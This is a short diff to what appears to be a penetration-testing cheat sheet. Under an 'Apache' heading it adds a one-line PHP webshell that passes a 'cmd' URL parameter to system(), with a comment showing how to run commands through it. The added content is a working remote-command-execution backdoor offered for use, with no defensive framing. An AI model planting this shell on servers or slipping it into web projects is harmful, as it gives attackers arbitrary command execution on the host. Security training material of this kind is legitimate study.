@@ -7,4 +7,8 @@ tree /usr/share/webshells/
 ```
 
 ## Apache
-aaaa
+Basic PHP webshell
+```
+# Take input from the URL paramter. e.g http://<IP>/shell.php?cmd=whoami
+<?php system($_GET['cmd']); ?>
+```
